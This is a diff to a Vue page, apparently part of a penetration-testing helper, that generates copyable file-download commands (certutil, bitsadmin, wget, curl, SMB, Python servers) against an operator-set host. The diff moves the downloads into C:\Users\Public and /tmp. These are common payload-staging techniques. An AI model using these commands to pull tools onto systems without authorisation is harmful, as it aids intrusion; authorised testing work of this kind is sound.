@@ -42,14 +42,32 @@ function copy(id) {
     <div class="main_bountytips">
       <h3>文件下载命令快捷生成:</h3>
       <div class="tips">
-        Python2 HTTP:
-        <pre id="cmd001">python -m SimpleHTTPServer {{ web.port }}</pre>
-        <button @click="copy('cmd001')">Copy</button>
+        CMD - Certutil:
+        <pre
+            id="cmd007">certutil.exe -urlcache -split -f http://{{ web.ip }}:{{ web.port }}/{{ web.Source }} C:\Users\Public\{{
+            web.name
+          }}</pre>
+        <button @click="copy('cmd007')">Copy</button>
+      </div>
+      <div class="tips">
+        Linux - wget:
+        <pre id="cmd009">wget http://{{ web.ip }}:{{ web.port }}/{{ web.Source }} -O /tmp/{{ web.name }}</pre>
+        <button @click="copy('cmd009')">Copy</button>
+      </div>
+      <div class="tips">
+        Linux - curl:
+        <pre id="cmd010">curl http://{{ web.ip }}:{{ web.port }}/{{ web.Source }} -o /tmp/{{ web.name }}</pre>
+        <button @click="copy('cmd010')">Copy</button>
       </div>
       <div class="tips">
         Python3 HTTP:
         <pre id="cmd002">python3 -m http.server {{ web.port }}</pre>
         <button @click="copy('cmd002')">Copy</button>
+      </div>
+      <div class="tips">
+        Python2 HTTP:
+        <pre id="cmd001">python -m SimpleHTTPServer {{ web.port }}</pre>
+        <button @click="copy('cmd001')">Copy</button>
       </div>
       <div class="tips">
         Python FTP:
@@ -77,29 +95,13 @@ function copy(id) {
           }}:{{ web.port }}/{{ web.Source }}', {{ web.name }})"</pre>
         <button @click="copy('cmd006')">Copy</button>
       </div>
-      <div class="tips">
-        CMD - Certutil:
-        <pre
-            id="cmd007">certutil.exe -urlcache -split -f http://{{ web.ip }}:{{ web.port }}/{{ web.Source }} {{
-            web.name
-          }}</pre>
-        <button @click="copy('cmd007')">Copy</button>
-      </div>
+
       <div class="tips">
         CMD - SMB:
         <pre id="cmd008">copy \\{{ web.ip }}\files\{{ web.Source }} {{ web.name }}</pre>
         <button @click="copy('cmd008')">Copy</button>
       </div>
-      <div class="tips">
-        Linux - wget:
-        <pre id="cmd009">wget http://{{ web.ip }}:{{ web.port }}/{{ web.Source }} -O {{ web.name }}</pre>
-        <button @click="copy('cmd009')">Copy</button>
-      </div>
-      <div class="tips">
-        Linux - curl:
-        <pre id="cmd010">curl http://{{ web.ip }}:{{ web.port }}/{{ web.Source }} -o {{ web.name }}</pre>
-        <button @click="copy('cmd010')">Copy</button>
-      </div>
+
       <div class="tips">
         Windows Bitsadmin:
         <pre id="cmd011">bitsadmin /rawreturn /transfer down "http://{{ web.ip }}:{{ web.port }}/{{ web.Source }}" c:\\Users\\Public\\{{
@@ -144,7 +146,6 @@ function copy(id) {
 }
 
 button {
-
   padding: 0 5px;
   margin: 0;
 }
